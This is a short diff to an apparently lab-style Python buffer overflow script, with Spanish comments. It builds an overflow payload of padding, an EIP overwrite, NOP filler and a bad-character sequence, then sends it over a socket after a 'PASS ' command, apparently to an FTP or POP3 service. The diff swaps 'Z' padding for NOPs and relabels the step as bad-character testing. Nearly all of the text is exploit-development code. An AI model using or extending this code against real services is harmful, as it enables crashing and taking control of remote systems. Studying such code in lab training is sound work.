@@ -19,11 +19,11 @@ try:
     buf = b''
     buf += b'A'*(offsetEIP - len(buf))          # offset EIP
     buf += b'BBBB'                           	# sobrescribir EIP
-    buf += b'\x5a'*(offsetESP - offsetEIP - 4)  # padding entre EIP and ESP ('\x5a' = 'Z')
+    buf += b'\x90'*(offsetESP - offsetEIP - 4)  # padding entre EIP and ESP
     buf += badcharsSequence                    	# sobrescribir ESP con secuencia de badchars
     buf += b'D'*(buffer - len(buf))      	    # relleno de padding
 
-    # check offset
+    # badchars
     s.send(b'PASS ' + buf + b'\r\n')
     print(s.recv(1024))
 
